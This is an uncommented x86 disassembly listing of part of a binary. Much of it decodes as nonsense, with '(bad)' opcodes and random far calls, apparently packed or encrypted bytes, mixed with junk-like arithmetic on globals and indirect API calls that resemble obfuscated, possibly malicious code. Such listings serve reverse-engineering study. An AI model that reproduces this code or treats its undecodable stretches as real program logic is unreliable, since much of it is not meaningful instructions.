  4021d6:	sub    eax,0x85dbf611
  4021db:	pop    edx
  4021dc:	cld    
  4021dd:	lods   eax,DWORD PTR ds:[esi]
  4021de:	pop    eax
  4021df:	fiadd  DWORD PTR [edi+0x5fba1569]
  4021e5:	aad    0x91
  4021e7:	loope  0x402226
  4021e9:	pop    edi
  4021ea:	mov    al,0x3f
  4021ec:	adc    edi,DWORD PTR [edi-0x47]
  4021ef:	sub    BYTE PTR [edi-0x5],0x13
  4021f3:	sbb    ecx,0x59b0abdf
  4021f9:	mov    dh,0x74
  4021fb:	bound  edx,QWORD PTR [eax]
  4021fd:	ja     0x4021dc
  4021ff:	push   ds
  402200:	xor    DWORD PTR [ecx+0x45],edx
  402203:	jge    0x402197
  402205:	cli    
  402206:	push   es
  402207:	ins    DWORD PTR es:[edi],dx
  402208:	data16 adc ch,bl
  40220b:	inc    ebx
  40220c:	inc    eax
  40220d:	xchg   edx,eax
  40220e:	and    eax,0xf9f38f10
  402213:	cmp    DWORD PTR [edi],ebx
  402215:	fwait
  402216:	cmp    al,0x1a
  402218:	push   0xffffffd8
  40221a:	adc    esi,DWORD PTR [ecx]
  40221c:	or     ch,BYTE PTR [ebp-0x30dc726f]
  402222:	xchg   ebp,eax
  402223:	dec    ebp
  402224:	mov    eax,0x4c333b4
  402229:	sbb    DWORD PTR [esi+0x6e],eax
  40222c:	adc    al,0x9d
  40222f:	call   0xd688dbb6
  402234:	sub    eax,DWORD PTR [edi]
  402236:	repnz adc edx,DWORD PTR [ebx-0x402311ad]
  40223d:	xor    DWORD PTR [ecx],0xffffffb5
  402240:	xchg   BYTE PTR [edx+ecx*4],ah
  402243:	or     bl,BYTE PTR [esi+0x5b6fbca5]
  402249:	cmp    BYTE PTR ds:0x895923,0xe4
  402250:	mov    ch,0x54
  402252:	enter  0x93ca,0xd3
  402256:	mov    cl,0x51
  402258:	jecxz  0x4022cc
  40225a:	in     eax,0xd0
  40225c:	inc    ebp
  40225d:	imul   BYTE PTR [ebx]
  40225f:	retf   
  402260:	mov    eax,ds:0xbc9d4912
  402265:	adc    ebx,esi
  402267:	clc    
  402268:	xor    al,bl
  40226a:	cdq    
  40226b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40226c:	mov    eax,ds:0xb219dce1
  402271:	aaa    
  402272:	test   eax,0xdef34ba1
  402277:	pop    ebp
  402278:	arpl   WORD PTR [esp+eax*4],si
  40227b:	mov    al,BYTE PTR [ecx]
  40227d:	push   eax
  40227e:	mov    esi,0x7d3f0e16
  402283:	retf   
  402284:	je     0x402210
  402286:	sbb    BYTE PTR [ebx+0x12],ah
  402289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228a:	xor    DWORD PTR [edx+0x68],edi
  40228d:	xor    dh,BYTE PTR [ebx+0x1a]
  402290:	jg     0x402232
  402292:	xchg   esi,ecx
  402294:	mov    bh,BYTE PTR [ebx+eiz*1-0x62]
  402298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402299:	sbb    ebx,DWORD PTR ds:0xc355b7e6
  40229f:	pop    es
  4022a0:	push   edi
  4022a1:	mov    bh,0xb5
  4022a3:	imul   ecx,DWORD PTR [edx+ebp*4+0x4afe4754],0x3e
  4022ab:	(bad)  
  4022ac:	(bad)  
  4022ad:	mov    bh,0xb0
  4022af:	adc    dh,BYTE PTR [ebx]
  4022b1:	lock or ebx,DWORD PTR [edx-0x61]
  4022b5:	mul    DWORD PTR [edi]
  4022b7:	dec    edi
  4022b8:	dec    edi
  4022ba:	aam    0xbf
  4022bc:	lods   eax,DWORD PTR ds:[esi]
  4022bd:	or     BYTE PTR [ebp-0x77],bh
  4022c0:	adc    bh,dl
  4022c2:	or     esi,DWORD PTR [esi-0xf7f56c7]
  4022c8:	push   ecx
  4022c9:	mov    al,0xa8
  4022cb:	mov    ch,0xf6
  4022cd:	xor    BYTE PTR [edx+0x9],al
  4022d0:	inc    ecx
  4022d1:	js     0x4022cb
  4022d3:	adc    al,0x84
  4022d5:	inc    ebp
  4022d6:	mov    ebx,0x8719293a
  4022db:	(bad)  
  4022dc:	mov    eax,0x5a0892b4
  4022e1:	jo     0x402269
  4022e3:	clts   
  4022e5:	jge    0x402326
  4022e7:	inc    ebx
  4022e8:	push   0xffffffd5
  4022ea:	ds loope 0x4022df
  4022ed:	aad    0x26
  4022ef:	cmp    BYTE PTR ds:0xfc337e46,0x44
  4022f6:	out    dx,eax
  4022f7:	lock inc esi
  4022f9:	adc    DWORD PTR [edi*1-0x78f64880],ebx
  402300:	cmp    cl,BYTE PTR ds:0xa987d749
  402306:	add    BYTE PTR [ecx+ecx*1-0x6948ad5e],cl
  40230d:	xlat   BYTE PTR ds:[ebx]
  40230e:	push   edx
  40230f:	push   0xffffffd4
  402311:	ins    BYTE PTR es:[edi],dx
  402312:	inc    esi
  402313:	shr    esi,0x8
  402316:	sbb    al,0x5d
  402318:	div    BYTE PTR ds:0x6492bb5d
  40231f:	sub    al,0x8d
  402321:	jp     0x4022c0
  402323:	neg    BYTE PTR [eax+0x46a69df]
  402329:	ret    
  40232a:	retf   
  40232b:	mov    esi,ebx
  40232d:	mov    esp,0xab82a20a
  402332:	push   0x86a0d234
  402337:	sub    eax,0x1f2acc05
  40233c:	add    eax,0x921ed1f
  402341:	pushf  
  402342:	gs dec esi
  402344:	retf   
  402345:	cli    
  402346:	mov    edi,0xa102b061
  40234b:	jecxz  0x40235b
  40234d:	out    dx,eax
  40234e:	fwait
  40234f:	out    0x7c,eax
  402351:	mov    esp,0x946a9944
  402356:	sub    BYTE PTR [edx+ecx*4-0x603b1a30],dl
  40235d:	jnp    0x402361
  40235f:	add    edx,DWORD PTR [ebx*1+0x758aceff]
  402366:	xor    DWORD PTR [esi],esi
  402368:	sbb    DWORD PTR [eax],ecx
  40236a:	xlat   BYTE PTR ds:[ebx]
  40236b:	adc    BYTE PTR [edx+0x59],bl
  40236e:	fdivr  QWORD PTR [esi+0x3f]
  402371:	jp     0x40234a
  402373:	jle    0x4023aa
  402375:	test   ah,dl
  402377:	jno    0x402327
  402379:	xchg   BYTE PTR [ecx],al
  40237b:	and    esi,DWORD PTR [ebp-0x7a]
  40237e:	pop    ds
  40237f:	in     al,0x35
  402381:	push   ss
  402382:	scas   eax,DWORD PTR es:[edi]
  402383:	out    0xdf,al
  402385:	sub    dl,BYTE PTR [ebp+ecx*4+0x490da8ce]
  40238c:	push   cs
  40238d:	mov    esp,0xa11b5c05
  402392:	mov    esi,0xc9e8221c
  402397:	(bad)  
  402398:	xlat   BYTE PTR ds:[ebx]
  402399:	jo     0x402415
  40239b:	jne    0x402365
  40239d:	mov    DWORD PTR ds:0x90a10cf9,edx
  4023a3:	addr16 xchg ecx,eax
  4023a5:	adc    DWORD PTR [ecx+0x4d665dc2],edi
  4023ab:	push   edx
  4023ac:	loope  0x402416
  4023ae:	xor    eax,0x55a7cc7b
  4023b3:	scas   eax,DWORD PTR es:[edi]
  4023b4:	idiv   DWORD PTR [eax-0x7d439849]
  4023ba:	pop    edx
  4023bb:	xor    ch,ch
  4023bd:	cld    
  4023be:	dec    esi
  4023bf:	fnstenv [ecx]
  4023c1:	es inc edi
  4023c3:	lock cdq 
  4023c5:	js     0x402406
  4023c7:	inc    eax
  4023c8:	jne    0x402353
  4023ca:	jge    0x402412
  4023cc:	loop   0x402400
  4023ce:	sar    DWORD PTR [ecx],cl
  4023d0:	and    al,BYTE PTR [esi]
  4023d2:	(bad)
  4023d6:	test   DWORD PTR [ebp+esi*4-0x6ff0e88c],ecx
  4023dd:	cmp    edi,ebp
  4023df:	pop    ebx
  4023e0:	xor    eax,DWORD PTR [ebx]
  4023e2:	test   eax,0xf4f2e604
  4023e7:	mov    esi,0x830eaf52
  4023ec:	sbb    BYTE PTR [ecx],ch
  4023ee:	cmp    eax,DWORD PTR [edx-0x2a]
  4023f1:	dec    ebx
  4023f2:	cmp    DWORD PTR [esi+0x4936e380],ebx
  4023f8:	or     al,0x8b
  4023fa:	mov    edx,0xf680fea
  4023ff:	sub    eax,0x1d810000
  402404:	pop    ecx
  402405:	test   BYTE PTR [edx+0x0],al
  402408:	add    DWORD PTR [edx+eax*2-0x1691800],0x4d8b0001
  402413:	cwde   
  402414:	mov    edx,DWORD PTR ds:0x428479
  40241a:	add    DWORD PTR ds:0x428395,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x428565,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x4284fd,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42859d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x422758
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x4284e5
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x42845d
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x42834d,0x0
  40246f:	mov    DWORD PTR ds:0x428569,ebx
  402475:	mov    edx,DWORD PTR ds:0x428465
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x428445,0xc4d
  40248a:	cmp    DWORD PTR ds:0x42834d,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x428441
  4024a9:	adc    DWORD PTR ds:0x42850d,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x42856d,0x36ec
  4024bf:	neg    DWORD PTR ds:0x428565
  4024c5:	adc    edx,DWORD PTR ds:0x428361
  4024cb:	sbb    DWORD PTR ds:0x4285a1,edi
  4024d1:	sbb    DWORD PTR ds:0x42856d,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x428511,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x428521,0x0
  402501:	mov    DWORD PTR ds:0x428435,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x428511,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x428521
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x428521,0x0
  402529:	je     0x40255f
  40252f:	push   0x428389
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428275
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428395
  40254d:	xor    edx,DWORD PTR ds:0x42838d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x428449,0x7db9
  40255f:	add    DWORD PTR ds:0x428485,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x428359,ecx
  40256c:	or     DWORD PTR ds:0x4284a1,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428391,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x428451
  40258b:	or     DWORD PTR ds:0x428585,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	popf   
  4025af:	pop    ebx
  4025b0:	je     0x40258f
  4025b2:	mov    esi,0xbdbebeda
  4025b7:	les    edi,FWORD PTR [esi-0x6cfd6a42]
  4025bd:	mov    dl,BYTE PTR [edi]
  4025bf:	(bad)  
  4025c0:	aaa    
  4025c1:	push   esi
  4025c2:	das    
  4025c3:	cmp    DWORD PTR [edi+0x22],0x8f950402
  4025ca:	jne    0x4025fd
  4025cc:	jne    0x40258c
  4025ce:	sbb    DWORD PTR [eax-0x3],ecx
  4025d1:	test   eax,0x12dc2b96
  4025d6:	out    dx,eax
  4025d7:	or     esp,esi
  4025d9:	(bad)  
  4025da:	sub    esi,DWORD PTR [ebx-0x7f]
  4025dd:	div    bl
  4025df:	jmp    0x5c65de8
  4025e4:	push   ds
  4025e5:	popf   
  4025e6:	sti    
  4025e7:	loope  0x4025d3
  4025e9:	lock mov esi,ebp
  4025ec:	push   es
  4025ed:	arpl   WORD PTR gs:[ebp-0x64],cx
  4025f1:	sbb    BYTE PTR ds:0x701c105a,bh
  4025f7:	aam    0xb7
  4025f9:	and    eax,0x4a046da9
  4025fe:	arpl   WORD PTR [esi-0x1a406081],bp
  402604:	add    BYTE PTR [edx],dh
  402606:	mov    ebp,0x270c5079
  40260b:	scas   eax,DWORD PTR es:[edi]
  40260c:	ret    
  40260d:	mov    ebx,?
  40260f:	in     eax,0x4a
  402611:	in     al,0x79
  402613:	mov    eax,0x22c49a07
  402618:	push   ecx
  402619:	bound  edi,QWORD PTR [ebp+0x70]
  40261c:	cmp    eax,0xc4a07d55
  402621:	jle    0x4025d9
  402623:	dec    esi
  402624:	jnp    0x402690
  402626:	inc    eax
  402627:	cmp    dh,BYTE PTR ds:0x878141c1
  40262d:	push   0xffffffc3
  40262f:	pop    esp
  402630:	lods   al,BYTE PTR ds:[esi]
  402631:	mov    dh,BYTE PTR [ebp*1-0x1af22c6c]
  402638:	ret    
  402639:	xchg   DWORD PTR [edi+0x3e],esp
  40263c:	ret    
  40263d:	push   ss
  40263e:	add    edi,eax
  402640:	mov    al,ds:0xa141da95
  402645:	fldcw  WORD PTR [ecx]
  402647:	push   ebx
  402648:	outs   dx,DWORD PTR ds:[esi]
  402649:	mov    edx,0x98ecd965
  40264e:	pop    ss
  40264f:	pop    esi
  402650:	into   
  402651:	dec    DWORD PTR [esi-0x11]
  402654:	jmp    0x40260c
  402656:	and    dl,dl
  402658:	dec    esi
  402659:	mov    eax,ds:0x550a8e4a
  40265e:	fistp  DWORD PTR [edi+ebp*2-0x5]
  402662:	lds    esp,FWORD PTR [ebp+0x659d347b]
  402668:	call   0x9f1f:0x8dadfd4d
  40266f:	or     eax,0xc56dc683
  402674:	inc    eax
  402675:	das    
  402676:	add    al,0x1f
  402678:	loop   0x4026b6
  40267a:	out    dx,al
  40267b:	aas    
  40267c:	outs   dx,BYTE PTR ds:[esi]
  40267d:	push   edi
  40267e:	out    0x40,al
  402680:	fdivr  DWORD PTR [ecx+0x3f6b11e6]
  402686:	mov    cs,WORD PTR [ebx+ecx*8-0x3d]
  40268a:	jl     0x402622
  40268c:	icebp  
  40268d:	xor    ecx,edi
  40268f:	in     eax,0x9f
  402691:	and    eax,0xaa9991a9
  402696:	stos   BYTE PTR es:[edi],al
  402697:	cdq    
  402698:	jnp    0x4026d9
  40269a:	ins    BYTE PTR es:[edi],dx
  40269b:	jmp    0x26afdaed
  4026a0:	sar    BYTE PTR [ecx+eiz*4],0xc3
  4026a4:	jbe    0x40262e
  4026a6:	push   ss
  4026a7:	push   ebp
  4026a8:	adc    eax,0x7ef9a2a5
  4026ad:	mov    cs,WORD PTR [esi+0x66cdbc9e]
  4026b3:	into   
  4026b4:	repnz repnz sbb al,BYTE PTR [esi]
  4026b8:	mov    ebp,0xabfdf666
  4026bd:	mov    ds,WORD PTR [eax-0x5f]
  4026c0:	jmp    0x4026b2
  4026c2:	aaa    
  4026c3:	pop    ebx
  4026c4:	into   
  4026c5:	ror    esi,cl
  4026c7:	imul   ebp,DWORD PTR [edi],0x1c
  4026ca:	ins    DWORD PTR es:[edi],dx
  4026cb:	shl    BYTE PTR [eax+0x60a292ce],0x97
  4026d2:	aas    
  4026d3:	rcl    cl,1
  4026d5:	(bad)  
  4026d6:	dec    ecx
  4026d7:	jg     0x4026c9
  4026d9:	mov    al,al
  4026db:	add    ecx,DWORD PTR [ecx+edx*8+0x62465d76]
  4026e2:	jbe    0x4026cf
  4026e4:	fisubr WORD PTR ds:0x81b3ecc5
  4026ea:	rol    BYTE PTR [esp+esi*4-0x3b],1
  4026ee:	push   edi
  4026ef:	(bad)  
  4026f0:	lea    edx,ds:[ecx]
  4026f3:	addr16 inc esp
  4026f5:	mov    bh,0xd
  4026f7:	fisubr DWORD PTR [ecx+0x7b]
  4026fa:	das    
  4026fb:	jb     0x4026cc
  4026fd:	mov    edi,0xeb927b49
  402702:	dec    ebp
  402703:	aas    
  402704:	(bad)  
  402705:	jmp    0x402723
  402707:	popf   
  402708:	(bad)  
  402709:	cld    
  40270a:	cwde   
  40270b:	cs das 
  40270d:	add    BYTE PTR [edx+0x535b5eae],ah
  402713:	mov    ch,0x7f
  402715:	jp     0x402736
  402717:	scas   al,BYTE PTR es:[edi]
  402718:	dec    esi
  402719:	push   edi
  40271a:	ins    DWORD PTR es:[edi],dx
  40271b:	(bad)  
  40271d:	add    eax,0x6ae7a4c7
  402722:	dec    ebp
  402723:	popa   
  402724:	loopne 0x40272a
  402726:	stos   BYTE PTR es:[edi],al
  402727:	lods   eax,DWORD PTR ds:[esi]
  402728:	lds    esp,FWORD PTR [ecx]
  40272a:	xlat   BYTE PTR ds:[ebx]
  40272b:	mov    eax,ds:0xae228950
  402730:	push   eax
  402731:	sub    BYTE PTR [edx+0x31],dh
  402734:	xor    bl,BYTE PTR [edi-0x33cf7b3e]
  40273a:	mov    DWORD PTR [ebx-0x57fa1a4],ebx
  402740:	xlat   BYTE PTR ds:[ebx]
  402741:	fmulp  st(3),st
  402743:	nop
  402744:	std    
  402745:	jmp    0xd92ea924
  40274a:	inc    edx
  40274b:	xor    cl,bh
  40274d:	sar    bh,cl
  40274f:	and    dl,BYTE PTR [ebp+0x5c]
  402752:	stc    
  402753:	pop    esp
  402754:	stc    
  402755:	push   edi
  402756:	daa    
  402757:	test   DWORD PTR [edx-0xa],ebx
  40275a:	fbld   TBYTE PTR [eax+0x8]
  40275d:	xor    esi,DWORD PTR [esi]
  40275f:	mov    dl,0x74
  402761:	cli    
  402762:	jmp    0xf6b3:0x196c1b34
  402769:	mov    ds:0xed326809,al
  40276e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402770:	fcomp  QWORD PTR [eax-0x5e]
  402773:	jnp    0x4027df
  402775:	fsub   st(1),st
  402777:	ret    0x3bcb
  40277a:	mov    edx,0xd4c82f08
  40277f:	sbb    edi,ebp
  402781:	inc    edi
  402782:	out    0x2c,al
  402784:	dec    esi
  402785:	mov    cs,WORD PTR [ecx+0x4abcd777]
  40278b:	fstcw  WORD PTR [eax+0x54]
  40278f:	xchg   edi,eax
  402790:	add    eax,0x8b07891d
  402795:	pushf  
  402796:	not    DWORD PTR [ecx+0x7cdc496a]
  40279c:	xor    BYTE PTR [edx],bh
  40279e:	mov    ah,0xf
  4027a0:	mov    edx,0x5dda1dc4
  4027a5:	bnd ret 
  4027a7:	(bad)  
  4027a8:	loope  0x402741
  4027aa:	ror    DWORD PTR [esi+0x71e2ec9d],cl
  4027b0:	pop    esi
  4027b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027b3:	xchg   ebp,eax
  4027b4:	xor    dh,BYTE PTR [ebx]
  4027b6:	push   es
  4027b7:	pop    ecx
  4027b8:	arpl   WORD PTR [eax+0x75],sp
  4027bb:	stos   DWORD PTR es:[edi],eax
  4027bc:	(bad)  
  4027be:	mov    cl,0xcd
  4027c0:	mov    cl,0x3e
  4027c2:	iret   
  4027c3:	add    eax,0x9ee7e154
  4027c8:	xlat   BYTE PTR ds:[ebx]
  4027c9:	mov    esi,0x1739793f
  4027ce:	add    eax,0xfba28ae6
  4027d3:	and    BYTE PTR [ebx],cl
  4027d5:	mov    eax,0xb0b4938c
  4027da:	xchg   edi,eax
  4027db:	addr16 inc ebx
  4027dd:	dec    edx
  4027de:	cmp    cl,dl
  4027e0:	js     0x40277f
  4027e2:	shl    BYTE PTR [ecx],1
  4027e4:	xor    eax,DWORD PTR [esi+ebx*1]
  4027e7:	pusha  
  4027e8:	(bad)  
  4027e9:	xor    dl,BYTE PTR [edx]
  4027eb:	test   BYTE PTR [edi+0x16],bl
  4027ee:	cdq    
  4027ef:	jne    0x40284d
  4027f1:	push   edx
  4027f2:	xchg   esp,eax
  4027f3:	xchg   esi,eax
  4027f4:	int3   
  4027f5:	mov    edx,esi
  4027f7:	frstor [ebx]
  4027f9:	inc    ecx
  4027fa:	mov    dl,0x69
  4027fc:	out    0x3b,eax
  4027fe:	aas    
  4027ff:	retf   0xb8c4
  402802:	pop    eax
  402803:	fst    QWORD PTR [ebp-0x2]
  402806:	enter  0x4244,0x1d
  40280a:	sub    ch,BYTE PTR [ecx]
  40280c:	mov    ebx,0xec565637
  402811:	aam    0xb8
  402813:	push   cs
  402814:	xchg   BYTE PTR ds:0x7c5ac5a4,ah
  40281a:	mov    bh,0x46
  40281c:	pop    ds
  40281d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40281e:	sub    dh,bh
  402820:	fmul   DWORD PTR [eax]
  402822:	adc    eax,0xc95d0f8e
  402827:	imul   edi,DWORD PTR [esi-0x23bd90a1],0x427e097e
  402831:	int3   
  402832:	(bad)  
  402833:	push   0x5f752b74
  402838:	and    BYTE PTR [ecx+0x1a],al
  40283b:	(bad)  
  40283c:	mov    WORD PTR [edx-0x6a],gs
  40283f:	xor    al,0xa3
  402841:	loopne 0x402881
  402843:	cmp    BYTE PTR [ecx],ch
  402845:	mov    BYTE PTR ds:0x7df9eecb,0xf
  40284c:	and    BYTE PTR [eax+0x60],cl
  40284f:	sbb    BYTE PTR [ebx+0xc6a9671],ch
  402855:	mov    ch,0xaf
  402857:	jns    0x40280d
  402859:	int3   
  40285a:	mov    DWORD PTR [ecx],ebp
  40285c:	lock push ecx
  40285e:	push   esi
  40285f:	or     BYTE PTR [edx],ah
  402861:	in     al,dx
  402862:	pop    ds
  402863:	loop   0x4028d9
  402865:	lahf   
  402866:	retf   0x586
  402869:	or     eax,0x9b69a765
  40286e:	push   edx
  40286f:	call   0xaad4:0xb2e01ae5
  402876:	mov    ds:0x10989bac,eax
  40287b:	cli    
  40287c:	or     BYTE PTR [ebp-0x79],bl
  40287f:	(bad)  
  402880:	inc    ecx
  402881:	xchg   edx,eax
  402882:	jle    0x40280d
  402884:	lods   al,BYTE PTR ds:[esi]
  402885:	test   eax,0xb2bf767e
  40288a:	mov    edx,0x19caeff6
  40288f:	ret    
  402890:	inc    edx
  402891:	popf   
  402892:	and    eax,0x12053524
  402897:	imul   esp,ebx,0xa6c1bec8
  40289d:	ss xchg esi,eax
  40289f:	sbb    bl,BYTE PTR [ebx]
  4028a1:	(bad)  
  4028a2:	inc    ebx
  4028a3:	stc    
  4028a4:	iret   
  4028a5:	scas   eax,DWORD PTR es:[edi]
  4028a6:	pop    edi
  4028a7:	in     eax,dx
  4028a8:	iret   
  4028a9:	popf   
  4028aa:	jae    0x402892
  4028ac:	push   ds
  4028ad:	mov    ch,0xad
  4028af:	xlat   BYTE PTR ds:[ebx]
  4028b0:	push   0xaf91d77
  4028b5:	enter  0x805,0x66
  4028b9:	not    eax
  4028bb:	mov    edi,0xa3ae0fbc
  4028c0:	stc    
  4028c1:	cmp    eax,0x4a04c9c
  4028c6:	dec    ecx
  4028c7:	fist   DWORD PTR [esi+0x9]
  4028ca:	push   0x2dbb5bc0
  4028cf:	test   BYTE PTR [edx+eiz*4+0x23],cl
  4028d3:	adc    DWORD PTR [ecx+0x5f],ebp
  4028d6:	aaa    
  4028d7:	mov    dh,0x48
  4028d9:	retf   
  4028da:	in     al,dx
  4028db:	dec    edi
  4028dc:	sahf   
  4028dd:	test   BYTE PTR [edx-0x345cad8b],bl
  4028e3:	jne    0x402927
  4028e5:	mov    bl,0x70
  4028e7:	xor    al,0xa0
  4028e9:	pop    es
  4028ea:	hlt    
  4028eb:	cdq    
  4028ec:	icebp  
  4028ed:	mov    ch,0xcf
  4028ef:	mov    ds:0x60ca9969,eax
  4028f4:	jp     0x4028ab
  4028f6:	push   0xffffffd4
  4028f8:	icebp  
  4028f9:	sbb    ebp,eax
  4028fb:	(bad)  
  4028fc:	stos   DWORD PTR es:[edi],eax
  4028fd:	and    al,0x85
  4028ff:	xchg   BYTE PTR [edi+edi*8+0x7ed576fe],ah
  402906:	call   0xa22a:0xcf0840fa
  40290d:	bound  eax,QWORD PTR [eax]
  40290f:	mov    ds:0x7abf5691,eax
  402914:	dec    edi
  402915:	ins    BYTE PTR es:[edi],dx
  402916:	adc    eax,0x13dfceb9
  40291b:	add    al,0xb
  40291d:	lahf   
  40291e:	jp     0x402953
  402920:	inc    ecx
  402921:	imul   edx,DWORD PTR [ebp-0x431530cf],0x70
  402928:	mov    dl,0x75
  40292a:	pop    edi
  40292b:	fcomp  st(0)
  40292d:	jp     0x402996
  40292f:	jns    0x402975
  402931:	cmp    eax,0x5afefbc3
  402936:	and    BYTE PTR fs:0x61f5f0bd,al
  40293d:	or     BYTE PTR [ebx+0x13bec4d],0xc7
  402944:	add    eax,0x428449
  402949:	sbb    DWORD PTR [esi+0x0],edi
  40294c:	add    BYTE PTR [edi],cl
  40294e:	test   edi,esp
  402950:	add    BYTE PTR [eax],al
  402952:	add    BYTE PTR [ebx+0x4285113d],al
  402958:	add    BYTE PTR [eax],al
  40295a:	mov    DWORD PTR ds:0x428565,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x428515,0x7d3d
  402979:	mov    eax,ds:0x428371
  40297e:	cmp    DWORD PTR ds:0x428511,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x4284a1,0x428389
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428575,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x42854d
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x428465,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428395,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428471,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x42836d,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42847d,0x428455
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x428429,0x428445
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428599,0x428351
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428471,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428389,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x4284e1
  402a42:	mov    eax,ds:0x428559
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x4225a0
  402a51:	add    edx,DWORD PTR ds:0x428385
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x428439,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x42836d
  402a69:	movzx  edx,WORD PTR ds:0x42835d
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x428439,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428489
  402a9c:	sbb    edx,DWORD PTR ds:0x428581
  402aa2:	mov    DWORD PTR ds:0x428489,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428491
  402aaf:	adc    DWORD PTR ds:0x428569,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x42834d
  402ac1:	or     DWORD PTR ds:0x428389,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x4284f1
  402ad7:	adc    DWORD PTR ds:0x428569,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428371,0x0
  402aea:	mov    DWORD PTR ds:0x4284f9,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42838d
  402afa:	mov    DWORD PTR ds:0x428361,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428595,ecx
